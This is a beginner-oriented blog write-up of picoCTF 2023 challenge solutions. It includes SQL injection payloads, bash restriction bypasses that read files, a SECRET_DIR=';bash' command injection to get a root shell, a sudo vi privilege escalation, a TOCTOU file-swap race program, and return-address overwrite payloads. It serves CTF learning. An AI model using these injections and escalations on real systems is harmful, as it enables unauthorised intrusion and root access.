---
title: picoCTF2023 Writeup
date: 2023-03-29 13:07:46
tags:
  - CTF
categories:
  - writeup
description: My personal writeup for picoCTF2023, trying to make beginners understand.
---

# Overview
The challenges I accomplished during competition:
- Web Exploitation (4/7)
  - [x] findme
  - [x] MatchTheRegex
  - [x] SOAP
  - [x] More SQLi
  - [ ] Java Code Analysis!?
  - [ ] cancri-sp
  - [ ] msfroggenerator2
- Cryptography (3/7)
  - [x] HideToSee
  - [x] ReadMyCert
  - [x] rotation
  - [ ] SRA
  - [ ] PowerAnalysis: Warmup
  - [ ] PowerAnalysis: Part 1
  - [ ] PowerAnalysis: Part 2
- Reverse Engineering (9/9)
  - [x] Ready Gladiator 0
  - [x] Ready Gladiator 1
  - [x] Ready Gladiator 2
  - [x] Reverse
  - [x] Safe Opener 2
  - [x] timer
  - [x] Virtual Machine 0
  - [x] Virtual Machine 1
  - [x] No way out
- Forensics (4/7)
  - [x] hideme
  - [x] PcapPoisoning
  - [x] who is it
  - [ ] FindAndOpen
  - [x] MSB
  - [ ] Invisible WORDs
  - [ ] UnforgottenBits
- General Skills (8/8)
  - [x] chrono
  - [x] money-ware
  - [x] Permissions
  - [x] repetitions
  - [x] Rules 2023
  - [x] useless
  - [x] Special
  - [x] Specialer
- Binary Exploitation (6/7)
  - [x] two-sum
  - [x] hijacking
  - [x] tic-tac
  - [x] VNE
  - [x] babygame01
  - [x] babygame02
  - [ ] Horsetrack
  
Finally I get 5200 scores and rank 301/6924 as an invidual team `OneAngryMan`. Below are my writeups.

---
# Writeups
## Web Exploitation
### findme
Input username as `test` and password as `test!` then click test button, we can find the title of current tab changing to "flag" quickly and the "flag" title disappear immediately. Since the hint is about `redirection`, I try to extract infomation from redirections through **Chrome DevTools**. But the weird thing is that if I open DevTools to intercept the network packets of login process, the redirections are completely jammed. Maybe this is a question of my local network, and I must use other tools to get the information in the redirections of url.

I recommend 2 ways here: Burpsuite and Python requests module. Then get two base64-like string in **id field** of redirection requests:
![burpsuite](img/picoCTF2023/findme.png)

Python requests module also works:
```python
import requests

r = requests.post(
    "http://saturn.picoctf.net:49645/login",
    data={"username": "test", "password": "test!"},
)
for req in r.history:
    print(req.content)
print(r.content)
```
Finally we combine two string and use base64 encode to get flag:
```shell
echo cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzgxZDRkODMxfQ== | base64 -d
# picoCTF{proxies_all_the_way_81d4d831}
```
### MatchTheRegex
We can find below javascript code in front-end of website:
```javascript
	function send_request() {
		let val = document.getElementById("name").value;
		// ^p.....F!?
		fetch(`/flag?input=${val}`)
			.then(res => res.text())
			.then(res => {
				const res_json = JSON.parse(res);
				alert(res_json.flag)
				return false;
			})
		return false;
	}
```
`^p.....F!?` is a regex string which means a string start with character `p` then following 5 any character plus a `F` character then end with a `!` or omit it. So input `picoCTF` and then we get flag.
### SOAP
The hint is XML external entity Injection and I directly google it then find a usable payload for this challenge:

![XXE payload](img/picoCTF2023/SOAP.png)
### More SQLi
First stage we should bypass the authentication of login process which is a typical SQL injection so we can fuzz the password from usual SQLi examples, here I use `admin' or '1'='1'--` as password.

After login, we need to extract the tables' infomation from database. Since this is a SQLite database, I google sth like "SQL injection in SQLite" and get a really useful reference: https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf .Then I follow this reference step by step and get flag through below query sentences:
```sql
1' union select 1,2,3 --+
1' union select tbl_name,sql,3 from sqlite_master--+
1' union select 1,flag,3 from more_table--+
```
## Cryptography
### HideToSee
Atbash cipher is a really simple algorithm but this challenge makes a lot of people confused at the beginning. I get stuck in this challenge for about a week and finally solve it through almost every picture steganography I can find on the web.

Use **`steghide`** to extract information from picture we get from:
```shell
steghide extract -sf atbash.jpg
# reference: https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/steganography
```
Then we use online [atbash cipher decrypt](https://www.dcode.fr/atbash-cipher) tool to decrypt extracted infomation.
### ReadMyCert
Google [online csr decoder](https://www.sslshopper.com/csr-decoder.html) and get flag.
![ReadMyCert](img/picoCTF2023/readmycert.png)
### rotation
A typical Caesar cipher and we can directly solve it [online](https://www.dcode.fr/caesar-cipher).
![rotation](img/picoCTF2023/rotation.png)
## Reverse Engineering
### Ready Gladiator 0/1/2
The Ready Gladiator series are more OSINT than reverse engineering for me, because I find all the solutions on the web. Anyway, [Core_War](https://en.wikipedia.org/wiki/Core_War) is definitely an interesting game from both programming's and mathematics' perspective. These 3 challenge we confront a same recode program -- [imp](https://corewar.co.uk/imp.htm), which copies itself recursively aiming to turn another program to imp too and go to a tie.

Challenge 0 requires always loses, no ties. The easiest way is to do nothing and program will end itself immediately, which is:
```
;assert 1
end
```

Challenge 1 requires wins which means we need kill the running imp sometimes. I am tired to understand redcode programming method so I directly google some core_war warriors:

```
;assert 1
;https://crypto.stanford.edu/~blynn/play/redcode.html
jmp 4
mov 2, -1
jmp -1
dat 9
spl -2
spl 4
add #-16, -3
mov -4, @-4
jmp -4
spl 2
jmp -1
end
```

Challenge 2 requires wins for 100/100 times. Cause imp is such a famous strategy in Core_War so there must be some existing anti-imp redcode programs. I try to use both google and ChatGPT, and ChatGPT gives me a program but doesn't work:

```
; Anti-IMP program
; Starts by jumping to the end of the code segment
; then creates a spiral pattern to scan for the enemy IMP program
start   JMP end      ; Jump to end of code segment

loop    ADD #1, scan ; Increment scan counter
        MOV scan, @scan ; Move the counter to the current scan location
        CMP scan, #0 ; Check if scan counter is zero
        JMP end, < ; Jump to end if counter is zero
        MOV #0, -1 ; Set the -1 memory location to zero
        ADD #1, -1 ; Increment the -1 memory location
        DJN -2, loop ; Decrement the -2 memory location and jump to loop if it is not zero

scan    EQU 0        ; Initialize the scan counter to zero

end     DAT #0       ; End of code segment
end
```

Finally I find a useful redcode through Google:
```
;assert 1
;https://corewar.co.uk/clearimp.htm
        org    start

gate    dat    4000,       1700
bomb    dat    >2667,      11

        for    4
        dat    0,0
        rof

        spl    #4000,      >gate
clear   mov    bomb,       >gate
        djn.f  clear,      >gate

        for    23
        dat    0,0
        rof

        istep  equ 1143           ; (CORESIZE+1)/7

start   spl    clear-1
        mov    imp,        *launch
        spl    1                  ; 32 parallel processes
        spl    1
        spl    1
        spl    1
        spl    1
        spl    nxpoint
launch  djn.f  3600,       <4000

        for    2
        dat    0,0
        rof

nxpoint add.f  #istep,     launch
        djn.f  clear-1,    <3000

imp     mov.i  #1,         istep
end
```
### Reverse
Use Linux `strings` then get flag.
```shell
strings ret | grep 'pico'
```
### Safe Opener 2
Use an online java class decomplier website and get java code below:
```java
import java.io.IOException;
import java.util.Base64;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;

// 
// Decompiled by Procyon v0.5.36
// 

public class SafeOpener
{
    public static void main(final String[] args) throws IOException {
        final BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in));
        final Base64.Encoder encoder = Base64.getEncoder();
        String encodedkey = "";
        String key = "";
        for (int i = 0; i < 3; ++i) {
            System.out.print("Enter password for the safe: ");
            key = keyboard.readLine();
            encodedkey = encoder.encodeToString(key.getBytes());
            System.out.println(encodedkey);
            final boolean isOpen = openSafe(encodedkey);
            if (isOpen) {
                break;
            }
            System.out.println("You have  " + (2 - i) + " attempt(s) left");
        }
    }
    
    public static boolean openSafe(final String password) {
        final String encodedkey = "picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_6d84122a}";
        if (password.equals(encodedkey)) {
            System.out.println("Sesame open");
            return true;
        }
        System.out.println("Password is incorrect\n");
        return false;
    }
}
```
Or directly `strings` it.
### timer
Use online jadx decompiler such as http://www.javadecompilers.com/apk or https://www.unboxapk.com/apk-decompiler to get decompiled data.

Then `grep` our flag in the directory including decompiled files:
```shell
grep -Ri "picoCTF" ./timer_source_from_JADX/
```
### Virtual Machine 0/1
.dae file is a kind of 3D model file and can be opened through many softwares such as SelfCAD, Autodesk Maya (cross-platform), or Blender. I choose to use blender on my local machine.
In the challenge 0, we can see blue and red axles and hint indicates that *the rotation of the red axle is input, the rotation of the blue axle is output*. But this hint actually confused a lot of people during the competition because of the puzzled input file.
I analyse the 3D model and find this is actually a **gear transmission model** after deleting some facial blocks:
![Virtual Machine 0](img/picoCTF2023/vm0.png)

We can easily compute that the speed of the blue gear is 5 times that of the red gear, so the input is actually the times of total rotating turns of red gear. But where is the flag? What we get is a long integer! If you are familiar with cryptography challenge, you can associate long integer with `long_to_bytes` in python crypto module:
```python
from Crypto.Util.number import long_to_bytes

red = 39722847074734820757600524178581224432297292490103996089444214757432940313
blue = red * 5
print(blue)
print(long_to_bytes(blue))
```
Then we get flag. This is also why this challenge gets the most dislike :)

In the challenge 1, we get another more sophisticated gear transmission model:
![Virtual Machine 1](img/picoCTF2023/vm1.png)
I ask my highschool classmate (major in Mechanical) to explain how to compute the ratio between three adjacent gears and the answer is **average**. I use a pen and paper to compute the ratio by hand. The final ratio is `9359`.
### No way out
A unity reverse challenge. At first we try to find the flag by playing this game directly :) then we are blocked by an invisible wall at board so we can't go to the place where flag is.

I google sth about "unity reverse engineering" and find some useful tools especially **dnSpy**. After looking up some CTF reverse challenge writeups about unity games (https://tripoloski1337.github.io/ctf/2019/09/09/reverse-engineering-unity-game.html and https://github.com/imadr/Unity-game-hacking) , I find the file named `Assembly-CSharp.dll` located at `pico_Data/Managed` contains the compiled Csharp files, and also the main program logic:
![dnSpy](img/picoCTF2023/nowayout2.png)

I change the `moveDirection.y` of jump button to a constant value, then save it and compile again. When come back to game, I jump like on the moon! The invisible wall seems restricted by a height so I jump over it and go to the flag:
![dnSpy](img/picoCTF2023/nowayout1.png)
## Forensics
### hideme
Use `binwalk -e ` to extract hidden files in png file, then we get a png file under `secret` directory:
![hideme](img/picoCTF2023/hideme.png)
OCR tool performs badly in recognize text of this picture so I read it by my eyes.
### PcapPoisoning
`strings ${filename} | grep pico`
### who is it
Extract the ip in .eml file, then use `whois 173.249.33.206 | grep person` to find person name in the dumped data.
### MSB
I search sth about MSB and find a useful tool in github:
```shell
# https://github.com/Pulho/sigBits
git clone https://github.com/Pulho/sigBits
python3 sigBits.py -t=msb ./Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png
```

Then grep "pico" in the `output.txt`. 
## General Skills
### chrono
`cd /challenge` directly and `cat`, probably a mistake of challenge makers.
### money-ware
I directly google `1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX` and find a news about it:
![money-ware](img/picoCTF2023/money-ware.png)

The answer is **Petya**.
### Permissions
Use vim to read file in /challenge (`vim /challenge`)  and get flag.
### repetitions
`cat ./enc_flag | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d` .
### Rules 2023
Open DevTools then `Ctrl+F` to search "pico".
### useless
`man useless` .
### Special
I find the solution to bypass bash restrictions at https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions. The space character is forbidden in this challenge, so we overwrite IFS(Internal Field Separator) variable and read flag:
```shell
IFS=];b=cat]/challenge/metadata.json;$b
```
### Specialer
In this challenge we can only use bash built-in command. https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions considerates ways to read file in this circumstance but the demo command can't read file content without newline character:
```shell
while read -r line; do echo $line; done < /etc/passwd
```

So I google about "how to use linux `read` to read a text file that ends without a newline", I get this answer (https://stackoverflow.com/questions/9408103/shell-script-how-to-read-a-text-file-that-does-not-end-with-a-newline-on-window) and it works:
```bash
#! /usr/bin/bash
# https://stackoverflow.com/questions/9408103/shell-script-how-to-read-a-text-file-that-does-not-end-with-a-newline-on-window

FileName='./ala/kazam.txt'
while [ 1 ] ; do    
    read -r line
    if [ -z $line ] ; then
        break
    fi
    fileNamesListStr="$fileNamesListStr $line"
    done < $FileName
echo "$fileNamesListStr"
```
## Binary Exploitation
### two-sum
The source C code doesn't prevent us from integer overflow:
```C
        else if (addIntOvf(sum, num1, num2) == -1)
        {
            printf("You have an integer overflow\n");
            fflush(stdout);
        }
```
So we let one of num1 and num2 be the **maxinum** of integer and the other be random positive integer. Since the `int` type in C language is 4 bytes and use [Two's complement](https://en.wikipedia.org/wiki/Two%27s_complement) to express integer number, the maxinum of int is ``2147483647`` which also can be easily searched with google. So we let num1 be ``2147483647`` and num2 be a arbitary postive number then we get flag.
### hijacking
I am stuck in this challenge for about a week and pay my almost whole attention to that python file due to the hints. The tag of this challenge includes `privilege-escalation` but I tried some uncorrect methods and missed the right way. During this time I am also attracted by the word "Social Engineering", and I try to many ways to make that python file usable for privilege-escalation such as write a new `ping` shell-script in PATH dir, not surprisingly, all failed.

I check the basic privilege-escalation techs (https://book.hacktricks.xyz/linux-hardening/privilege-escalation) again and find a step I missed:
```bash
sudo -l
```
Then I find `vi` is allowed in challenge's environment. So easily, I use `sudo vi /root` to get root privilege and read flag through vi. But the keyword in flag is about python library so maybe this an unintended solution.
### tic-tac
Simply search the keyword toctou at google and youtube then I get really useful resource for this challenge: 
https://www.youtube.com/watch?v=5g137gsB9Wk . This challenge is really similar to that in video, cause the most important reason of the vulnerability is that **race condition involving the checking of the state of a part of a system (such as a security credential) and the use of the results of that check** , according to [TOCTOU wikipedia](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use#:~:text=In%20software%20development%2C%20time%2Dof,the%20results%20of%20that%20check.) .

In this challenge, the reason why TOCTOU exists is that **we cannot check the uid of file and open file at the same time**, aka **this program is not atomic** . The solution to this vulnerability is simply adding a lock before check and unlock after open but that's another topic about Mutual exclusion.Another important reason is that **we use file name to read contents**:
```cpp
std::string filename = argv[1];
std::ifstream file(filename);
```

Since process can be interrupted by any other process, we can establish a soft link pointing to flag file and a empty file, for convenience I named them `flag_link` and `tic-tac` , implemented through:
```shell
ln -s ${flag_file} flag_link
touch tic-tac 
```

We use `ls -l` to check outputs and will find the owner of both `flag_link` and `tic-tac` is the same(not root), and `flag_link` is a symbol link pointing to flag file.

The second thing we need to know is when we actually open the file? I know nothing about C++, to solve this problem I extract the code below:
```cpp
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main()
{
    std::ifstream file("rename.c");
    if (file.is_open())
    {
        std::string line;
        while (getline(file, line))
        {
            std::cout << line << std::endl;
        }
    }
}
```

Then I set breakpoint at `open@plt` using gdb at the second time running (because of `lazy binding` we can't get libc address at the beginning), thus we can lookup the libc function call backtrace to attain the position where file opens at. According to the little program I made above, I finally found the file is open at  `std::ifstream file(filename);` .

During ``txtreader`` running time, we can cycle exchanging file name of `flag_link` and `tic-tac` to attain the running frame as below:
```cpp
  std::string filename = argv[1];
  //** input filename as tic-tac and we do first exchange here. 
  std::ifstream file(filename);
  //** the variable file actually points to the soft link to flag_file because of last exchange.
  struct stat statbuf;

  //** here we do the second exchange to restore, so that statbuf associates the stat of original tic-tac.

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }
  //** Since both the uid of tic-tac and real uid is both of normal user, we won't go to return here.

  // Read the contents of the file.
  //** The file opened at the beginning so whatever filename is, file must point to flag_file. 
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }
```

We do two exchanges before open file and before the uid check, aiming to open the flag_file and pass the check. The keypoint is that we can't control the timespot of file name exchange, but we can attain our purpose by infinite loop of exchanging process, and the running frame above will happen probabilistically.

But the thing is, if the exchanging operation is not atomic, running frame above will be more difficult to gain. Thankfully, we don't need to pay attention with this issue because the exchanging operation has atomic implementation:
```C
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}

// https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
// https://www.youtube.com/watch?v=5g137gsB9Wk
```

All the advance preparation done, we can concentrate on final exploiting. First, we running a process to exchange file names forever at backend. Second, we use `txtreader` to read `flag_link` or `tic-tac` until we read flag. I use `disown` to make a command line running in the backend because I'm not sure tmux or sth else is allowed in this challenge. So the whole exploitation is:
```bash
gcc rename.c -o rename
./rename flag_link tic-tac & disown # let rename running at backend
./txtreader tic-tac # or ./txtreader flag_link until we read flag
```

A really interesting tactou challenge.
### VNE
This program's logic is to `ls` the directory specified by environment variable `SECRET_DIR` with root privilege. Then use ghidra or IDAPro to figure out how this program do `ls`:
```cpp
    pbVar1 = std::operator<<((basic_ostream *)std::cout,"Listing the content of ");
    pbVar1 = std::operator<<(pbVar1,(char *)local_70);
    pbVar1 = std::operator<<(pbVar1," as root: ");
    std::basic_ostream<char,std::char_traits<char>>::operator<<
              ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
               std::endl<char,std::char_traits<char>>);
    std::allocator<char>::allocator();
                    /* try { // try from 00101435 to 00101439 has its CatchHandler @ 00101512 */
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
              ((char *)local_48,local_70);
                    /* try { // try from 0010144c to 00101450 has its CatchHandler @ 001014fd */
    std::operator+((char *)local_68,(basic_string.conflict *)&DAT_0010206d);
    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
              (local_48);
    std::allocator<char>::~allocator(&local_75);
    setgid(0);
    setuid(0);
    __command = (char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>
                        ::c_str();
                    /* try { // try from 0010148c to 001014d1 has its CatchHandler @ 00101530 */
    local_74 = system(__command);
```

The decompiled C++ program is ugly and I don't want to format it either. But we can see that the program call the `system` function during running, so we can set breakpoint at the position before call system to lookup what command is executed in this program using gdb. Then we will find the command is `ls $SECRET_DIR`. 

Things become easy after figuring out what the program is doing. Using a little knowledge of shell script, we simply wirte command as below:
```bash
export SECRET_DIR=';bash'
./bin
```

Then we get `root` privilege and read flag under `/root` directory.
### babygame01/02
babygame01 requires us to change a local virable on the stack frame. For convenience I use ghidra to decompile the binary file and make virable names easy to understand:
```C
undefined4 main(void)
{
  int opt;
  undefined4 ret;
  int in_GS_OFFSET;
  int player;
  int times;
  char target_char;
  undefined map [2700];
  int stack;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  stack = *(int *)(in_GS_OFFSET + 0x14);
  init_player(&player);
  init_map(map,&player);
  print_map(map,&player);
  signal(2,sigint_handler);
  do {
    do {
      opt = getchar();
      move_player(&player,(int)(char)opt,map);
      print_map(map,&player);
    } while (player != 0x1d);
  } while (times != 0x59);
  puts("You win!");
  if (target_char != '\0') {
    puts("flage");
    win();
    fflush(stdout);
  }
  ret = 0;
  if (stack != *(int *)(in_GS_OFFSET + 0x14)) {
    ret = __stack_chk_fail_local();
  }
  return ret;
}

void move_player(int *player,char opt,int map)
{
  int iVar1;
  if (opt == 'l') {
    iVar1 = getchar();
    player_tile = (undefined)iVar1;
  }
  if (opt == 'p') {
    solve_round(map,player);
  }
  *(undefined *)(*player * 0x5a + map + player[1]) = 0x2e;
  if (opt == 'w') {
    *player = *player + -1;
  }
  else if (opt == 's') {
    *player = *player + 1;
  }
  else if (opt == 'a') {
    player[1] = player[1] + -1;
  }
  else if (opt == 'd') {
    player[1] = player[1] + 1;
  }
  *(undefined *)(*player * 0x5a + map + player[1]) = player_tile;
  return;
}
```

Our player only occupied 1 byte on the map, but can change value on arbitary memory by moving player. Since we need to change 1 byte at position of `target_char` , the keypoint is to compute the offset of `target_char` and player position. I use gdb to check how many steps we need to move, and the final payload is:
```
aaaawwwwaaaap
```

Decompiled babygame02's main function is as below:
```C
undefined4 main(void)

{
  int iVar1;
  int player;
  int times;
  undefined map [2700];
  char opt;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  init_player(&player);
  init_map(map,&player);
  print_map(map,&player);
  signal(2,sigint_handler);
  do {
    do {
      iVar1 = getchar();
      opt = (char)iVar1;
      move_player(&player,(int)opt,map);
      print_map(map,&player);
    } while (player != 0x1d);
  } while (times != 0x59);
  puts("You win!");
  return 0;
}
```
Function `win` still exists but we don't have regular way to make program execute `win` function. Thus, also a typical method in stack overflow challenge, we need to modify the **return address** during function call. The frustrating thing is, if we check the program logic of `move_player` function carefully, we will find that we can only write 1 arbitary byte on the memory, and leave `0x2E` at old position after moving. So, we can only write **1** byte at the return address, but which byte should we rewrite?

With ghidra/IDA Pro or gdb we will get function `win`'s address -- `0x804975d`. And during debug, if we set breakpoint at `move_player`, we will get function call backtrace as below:
```
 ► f 0 0x8049479 move_player+5
   f 1 0x8049709 main+149
   f 2 0xf7c21519 __libc_start_call_main+121
   f 3 0xf7c215f3 __libc_start_main+147
   f 4 0x804911c _start+44
```

The return address `0x8049479` has only 1 byte difference! So our target is to rewrite 1 byte in the return address.

But there are two tips we need to pay attention with. First, we cannot do a lot of "a" before "d", because this method will taint local variable such as player, opt and map, which also locates near the return address. So we need to "d" first and use a single "a" to arrive our destination.

Second, also the most weird, we probably make it on our local machine use `0x5d`, but will fail on remote. We need to use offset such as `0x5e`, `0x60`, `0x61` and `0x64`. I still don't figure it out today, perhaps this issue related to implemention of libc printf function, cause through debug, the control flow changes indeed.

Final payload:
```
ladddddddddddddddddddddddddddddddddddddddddddddddwwwww
```
